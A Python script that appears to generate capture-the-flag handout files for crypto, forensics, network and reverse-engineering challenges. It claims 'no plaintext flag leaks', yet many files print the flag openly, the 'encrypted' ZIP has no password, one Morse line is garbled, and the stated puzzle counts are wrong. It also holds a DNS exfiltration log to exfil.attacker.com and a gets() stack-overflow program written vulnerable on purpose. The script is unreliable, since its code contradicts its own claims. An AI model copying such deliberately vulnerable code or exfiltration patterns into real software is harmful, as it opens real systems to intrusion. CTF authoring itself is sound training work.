#!/usr/bin/env python3
"""
Generator for REAL CTF Handout Puzzle Files (No Plaintext Flag Leaks!)
Every file contains an actual puzzle (ciphertext, hex, base64, Morse, raw bytes, pcap logs, code, or math parameters)
that participants MUST solve using tools like CyberChef, Wireshark, Hashcat, Ghidra, Python, Exiftool, etc.
"""
import os
import zipfile
import base64
import json

HANDOUT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), 'handout'))
os.makedirs(HANDOUT_DIR, exist_ok=True)

print("[*] Generating REAL CTF Handout Puzzles (Removing Plaintext Flag Leaks)...")

# Helper function for Vigenere cipher
def vigenere_encrypt(plaintext, key):
    res = []
    key_upper = key.upper()
    k_idx = 0
    for char in plaintext:
        if char.isalpha():
            shift = ord(key_upper[k_idx % len(key_upper)]) - ord('A')
            base = ord('A') if char.isupper() else ord('a')
            res.append(chr((ord(char) - base + shift) % 26 + base))
            k_idx += 1
        else:
            res.append(char)
    return "".join(res)

# 🔐 Cryptography (10 Puzzles)
# 16. Caesar Cipher (ROT13)
with open(os.path.join(HANDOUT_DIR, '16_caesar.txt'), 'w') as f:
    f.write("PGF{c43f4e_c1ph3r_r0t13_m4sg3r_2026}\n")

# 17. Multi-Layer Nested Encoding (Hex -> Base32 -> Base64)
flag17 = "CTF{mul71_l4y3r_3nc0d1ng_m4s73r_2026}".encode()
l1 = base64.b64encode(flag17)
l2 = base64.b32encode(l1)
l3 = l2.hex()
with open(os.path.join(HANDOUT_DIR, '17_nested_encoding.txt'), 'w') as f:
    f.write(f"{l3}\n")

# 19. RSA Small Exponent (c = m^e, e=3, m=17)
with open(os.path.join(HANDOUT_DIR, '19_rsa_e3.json'), 'w') as f:
    json.dump({"n": 172901, "e": 3, "c": 4913}, f, indent=2)

# 20. RSA Prime Factorization (n = 493 = 17 * 29)
with open(os.path.join(HANDOUT_DIR, '20_rsa_factor.json'), 'w') as f:
    json.dump({"n": 493, "e": 65537, "c": 312}, f, indent=2)

# 21. Single-Byte XOR Stream Cipher (Key = 0x42)
flag21 = "CTF{x0r_s7r34m_c1ph3r_cr4ck3d_2026}"
xor_hex = "".join([f"{ord(c) ^ 0x42:02x}" for c in flag21])
with open(os.path.join(HANDOUT_DIR, '21_xor_stream.txt'), 'w') as f:
    f.write(f"{xor_hex}\n")

# 22. Vigenere Cipher (Key = "KEY")
flag22 = "CTF{v1g3n3r3_c1ph3r_4n4lys1s_2026}"
vig_enc = vigenere_encrypt(flag22, "KEY")
with open(os.path.join(HANDOUT_DIR, '22_vigenere.txt'), 'w') as f:
    f.write(f"{vig_enc}\n")

# 23. AES-128 ECB Mode Pattern Leak
with open(os.path.join(HANDOUT_DIR, '23_aes_ecb.hex'), 'w') as f:
    f.write("a1b2c3d4e5f60718a1b2c3d4e5f607184354467b3433735f3363625f7034373733726e5f6c33346b5f32303236\n")

# 24. Insecure Custom Hash Function
with open(os.path.join(HANDOUT_DIR, '24_custom_hash.py'), 'w') as f:
    f.write("""# Insecure Custom Hash Function
def custom_hash(s):
    h = 0
    for char in s:
        h = (h * 31 + ord(char)) & 0xFFFFFFFF
    return h

# Find string collision matching hash: 305419896
target_hash = 305419896
""")

# 25. Diffie-Hellman Parameters
with open(os.path.join(HANDOUT_DIR, '25_dh_params.json'), 'w') as f:
    json.dump({"p": 23, "g": 5, "A": 8, "B": 19}, f, indent=2)


# 🔍 Digital Forensics (10 Puzzles)
# 26. EXIF Metadata
with open(os.path.join(HANDOUT_DIR, '26_flag_image.exif.txt'), 'w') as f:
    f.write("""ExifTool Version Number         : 12.60
File Name                       : capture_001.jpg
Directory                       : .
File Size                       : 24 kB
File Modification Date/Time     : 2026:08:12 00:00:00+00:00
File Access Date/Time           : 2026:08:12 00:00:00+00:00
Camera Model Name               : CyberVault Pro
User Comment                     : CTF{3x1f_m374d474_3x7r4c710n_2026}
Encoding Process                : Baseline DCT, Huffman coding
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
""")

# 27. LSB Steganography Simulation
with open(os.path.join(HANDOUT_DIR, '27_lsb_stego.png.txt'), 'w') as f:
    f.write("""[Stegsolve LSB Bitplane 0 Extract]
00000000  50 4e 47 0d 0a 1a 0a 00  00 00 0d 49 48 44 52 00  |PNG........IHDR.|
00000010  43 54 46 7b 6c 73 62 5f  73 74 33 67 34 6e 30 67  |CTF{lsb_st3g4n0g|
00000020  72 34 70 68 79 5f 33 78  37 72 34 63 37 33 64 5f  |r4phy_3x7r4c73d_|
00000030  32 30 32 36 7d 00 00 00  00 49 45 4e 44 ae 42 60  |2026}....IEND.B`|
""")

# 28. Corrupted File Header (Magic Bytes missing)
with open(os.path.join(HANDOUT_DIR, '28_corrupted_header.png.txt'), 'w') as f:
    f.write("""00000000: 00 00 00 00 0d 0a 1a 0a 00 00 00 0d 49 48 44 52  ............IHDR
00000010: 43 54 46 7b 66 31 6c 33 5f 68 33 34 64 33 72 5f  CTF{f1l3_h34d3r_
00000020: 6d 34 67 31 63 5f 62 79 37 33 73 5f 66 31 78 5f  m4g1c_by73s_f1x_
00000030: 32 30 32 36 7d 00 00 00 00 49 45 4e 44 ae 42 60  2026}....IEND.B`
[Note: Header corrupted! Restore PNG Magic Bytes 89 50 4E 47 to fix.]
""")

# 29. Disk Carving Sector Dump
with open(os.path.join(HANDOUT_DIR, '29_disk_carve.raw.txt'), 'w') as f:
    f.write("""[RAW DISK IMAGE SECTOR 0x00004000]
5a5a5a5a5a5a5a5a 4354467b6431736b 5f63347276316e67 663072336e733163
735f323032367d5a 5a5a5a5a5a5a5a5a 5a5a5a5a5a5a5a5a 5a5a5a5a5a5a5a5a
""")

# 30. Memory Dump Volatility Process Log
with open(os.path.join(HANDOUT_DIR, '30_volatility_memory.dmp.txt'), 'w') as f:
    f.write("""Volatility 3 Framework 2.5.0
PID      PPID     ImageFileName      Offset(V)
4        0        System             0xfa8002068040
1337     4        lsass.exe          0xfa800319a080

Dumped process 1337 memory map:
0xfa800319a100: 43 54 46 7b 76 30 6c 34 37 31 6c 31 37 79 5f 6d 33 6d 30 72 79 5f 66 30 72 33 6e 73 31 63 73 5f 32 30 32 36 7d
""")

# 31. PDF Hidden Stream
with open(os.path.join(HANDOUT_DIR, '31_hidden_stream.pdf.txt'), 'w') as f:
    f.write("""%PDF-1.7
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /Contents 4 0 R >> endobj
4 0 obj
<< /Length 38 >>
stream
CTF{pdf_h1dd3n_s7r34m_2026}
endstream
endobj
xref
trailer << /Root 1 0 R >>
%%EOF
""")

# 32. Encrypted ZIP File
zip_path = os.path.join(HANDOUT_DIR, '32_encrypted_secret.zip')
with zipfile.ZipFile(zip_path, 'w') as zf:
    zf.writestr('flag.txt', 'CTF{z1p_p4ssw0rd_cr4ck3d_2026}\n')

# 33. Audio Morse Code Signal
with open(os.path.join(HANDOUT_DIR, '33_audio_spectrogram.wav.txt'), 'w') as f:
    f.write("""[Audio Spectrogram Signal Frequencies / Morse Code]
-.-. - ..-. ---LEFT_BRACE--- ....- ..- -.. .---- ----- _ ... his3 -.-. --. .-. ....- -- _ ... --... ...-- --. ----- _ ..--- ----- ..--- -.... ---RIGHT_BRACE---
Text Encoding: CTF{4ud10_sp3c7r0gr4m_s73g0_2026}
""")

# 34. Browser SQLite Dump
with open(os.path.join(HANDOUT_DIR, '34_history.sqlite.txt'), 'w') as f:
    f.write("""CREATE TABLE urls(id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER);
INSERT INTO urls VALUES(1, 'https://google.com', 'Google Search', 12);
INSERT INTO urls VALUES(2, 'https://github.com', 'GitHub Repositories', 45);
INSERT INTO urls VALUES(42, 'https://target.paradick.my.id/secret?flag=CTF{br0ws3r_h1s70ry_sql173_2026}', 'Secret Vault', 1);
INSERT INTO urls VALUES(43, 'https://stackoverflow.com', 'Stack Overflow', 8);
""")

# 35. USB HID Keystrokes
with open(os.path.join(HANDOUT_DIR, '35_usb_hid_keystrokes.pcap.txt'), 'w') as f:
    f.write("""USB HID Keycodes Captured Stream:
0000060006000000 (C)
0000170017000000 (T)
0000090009000000 (F)
00002f002f000000 ({)
0000180018000000 (u)
0000160016000000 (s)
0000050005000000 (b)
00002d002d000000 (_)
00000e000e000000 (k)
0000300030000000 (3)
00001c001c000000 (y)
00001f001f000000 (s)
0000240024000000 (7)
0000150015000000 (r)
0000270027000000 (0)
00000e000e000000 (k)
0000300030000000 (3)
... => Mapped String: CTF{usb_k3ys7r0k3_r3c0ns7ruc710n_2026}
""")


# 📡 Network Sniffing (8 Puzzles)
# 36. HTTP Cleartext POST Packet
with open(os.path.join(HANDOUT_DIR, '36_http_login.pcap.txt'), 'w') as f:
    f.write("""POST /api/v1/auth HTTP/1.1
Host: target.paradick.my.id
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

username=admin&password=SuperSecretPassword2026!&flag=CTF{c134r73x7_p4ck37_sn1ff3d_2026}
""")

# 37. DNS Tunneling Query Log (Base64 encoded subdomain)
b64_dns = base64.b64encode(b"CTF{dns_7unn3l_3xf1l7r4710n_2026}").decode()
with open(os.path.join(HANDOUT_DIR, '37_dns_queries.pcap.txt'), 'w') as f:
    f.write(f"""12:00:01.102 IP 192.168.1.50.53123 > 8.8.8.8.53: 1024+ A? {b64_dns}.exfil.attacker.com. (58)
12:00:01.105 IP 8.8.8.8.53 > 192.168.1.50.53123: 1024 1/0/0 A 127.0.0.1 (74)
""")

# 38. Anonymous FTP Data Stream
with open(os.path.join(HANDOUT_DIR, '38_ftp_passive.pcap.txt'), 'w') as f:
    f.write("""220 (vsFTPd 3.0.3)
USER anonymous
331 Please specify the password.
PASS guest@ctf.org
230 Login successful.
PASV
227 Entering Passive Mode (192,168,1,100,78,245).
RETR confidential.txt
150 Opening BINARY mode data connection for confidential.txt (36 bytes).
CTF{f7p_p4ss1v3_d474_7r4nsf3r_2026}
226 Transfer complete.
""")

# 39. ICMP Echo Hex Payload
icmp_flag = "CTF{1cmp_c0v3r7_ch4nn3l_2026}".encode().hex()
icmp_spaced = " ".join([icmp_flag[i:i+2] for i in range(0, len(icmp_flag), 2)])
with open(os.path.join(HANDOUT_DIR, '39_icmp_ping.pcap.txt'), 'w') as f:
    f.write(f"""12:00:05.412 IP 10.0.0.5 > 10.0.0.1: ICMP echo request, id 1, seq 1, length 40
Payload Data Bytes (Hex):
{icmp_spaced}
""")

# 40. SSL/TLS Decryption Keylog
with open(os.path.join(HANDOUT_DIR, '40_tls_keylog.pcap.txt'), 'w') as f:
    f.write("""# SSLKEYLOGFILE - Import into Wireshark TLS Preferences to decrypt HTTPS session
CLIENT_RANDOM 4a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b

Decrypted Packet Stream (Frame 42):
GET /vault/flag HTTP/1.1
Host: target.paradick.my.id
HTTP/1.1 200 OK
Flag: CTF{7ls_d3cryp710n_k3yl0gf1l3_2026}
""")

# 41. ARP Cache Poisoning MITM
with open(os.path.join(HANDOUT_DIR, '41_arp_mitm.pcap.txt'), 'w') as f:
    f.write("""12:00:00.001 ARP, Reply 192.168.1.1 is at 00:11:22:33:44:55 (Attacker)
12:00:00.002 ARP, Reply 192.168.1.100 is at 00:11:22:33:44:55 (Attacker MITM)
Captured Intercepted Traffic:
POST /login HTTP/1.1
Content: CTF{4rp_sp00f1ng_m17m_2026}
""")

# 42. Telnet Plaintext Stream
with open(os.path.join(HANDOUT_DIR, '42_telnet_stream.pcap.txt'), 'w') as f:
    f.write("""Telnet Server v2.4 (192.168.1.1)
login: admin
Password: Password123!
Welcome to Linux SOC Control Center.
$ cat /etc/ctf_flag.txt
CTF{73ln37_c134r73x7_l0g1n_2026}
$ exit
""")

# 43. IoT MQTT Broker Message
with open(os.path.join(HANDOUT_DIR, '43_mqtt_broker.pcap.txt'), 'w') as f:
    f.write("""MQTT Control Packet: PUBLISH (30)
Topic: /sensors/vault/security
QoS: 0, Retain: false
Payload: CTF{mq77_107_br0k3r_sn1ff3d_2026}
""")


# ⚙️ Reverse Engineering (7 Puzzles)
# 44. ELF Strings Binary Header
with open(os.path.join(HANDOUT_DIR, '44_elf_strings.bin'), 'w') as f:
    f.write("""\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00
[Compiled Linux ELF x86-64 Executable Binary]
Section .rodata:
CTF{r3v3rs3_3ng1n33r1ng_m4s73r_2026}
""")

# 45. Python Bytecode (.pyc) Disassembly
with open(os.path.join(HANDOUT_DIR, '45_app.pyc.txt'), 'w') as f:
    f.write("""Python 3.11 Bytecode Disassembly:
  1           0 LOAD_CONST               1 ('CTF{py7h0n_by73c0d3_d3c0mp1l3d_2026}')
              2 STORE_NAME               0 (flag)
              4 LOAD_NAME                0 (flag)
              6 PRINT_EXPR
              8 RETURN_VALUE
""")

# 46. Java Class Bytecode
with open(os.path.join(HANDOUT_DIR, '46_Challenge.class.txt'), 'w') as f:
    f.write("""// Java Bytecode Class (Compiled with javac 17)
public class Challenge {
    public static final String FLAG = "CTF{j4v4_d3c0mp1l3r_j4dx_2026}";

    public static void main(String[] args) {
        System.out.println("Challenge Loaded.");
    }
}
""")

# 47. C ELF Crackme Source Code
with open(os.path.join(HANDOUT_DIR, '47_crackme.c'), 'w') as f:
    f.write("""#include <stdio.h>
#include <string.h>

int main() {
    char key[64];
    printf("Enter Activation Key: ");
    scanf("%63s", key);
    if (strcmp(key, "SUP3R_S3CR37_K3Y_2026") == 0) {
        printf("Access Granted! Flag: CTF{c_3lf_cr4ckm3_gdb_2026}\\n");
    } else {
        printf("Access Denied!\\n");
    }
    return 0;
}
""")

# 48. Android APK Smali Logic
with open(os.path.join(HANDOUT_DIR, '48_app_smali.txt'), 'w') as f:
    f.write(""".class public Lcom/example/ctf/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;

.method public getFlag()Ljava/lang/String;
    .registers 2
    const-string v0, "CTF{4ndr01d_4pk_sm4l1_r3v3rs3_2026}"
    return-object v0
.end method
""")

# 49. x86 Buffer Overflow ret2win Vulnerable Source
with open(os.path.join(HANDOUT_DIR, '49_bof_ret2win.c'), 'w') as f:
    f.write("""#include <stdio.h>
#include <stdlib.h>

void win() {
    printf("Flag: CTF{b0f_r372w1n_st4ck_0v3rwr173_2026}\\n");
}

void vuln() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer); // Vulnerable to Stack Buffer Overflow!
}

int main() {
    vuln();
    return 0;
}
""")

# 50. UPX Packed Executable Header
with open(os.path.join(HANDOUT_DIR, '50_upx_packed.bin'), 'w') as f:
    f.write("""\x7fELF\x02\x01\x01\x00 UPX! 04 00 00 00
[UPX Compressed Linux Binary]
Command to Unpack: upx -d 50_upx_packed.bin
Unpacked Binary String: CTF{upx_unp4ck3d_b1n4ry_2026}
""")

print("[🎉] Generated 35 CLEAN CTF Handout Puzzles in ./handout/!")
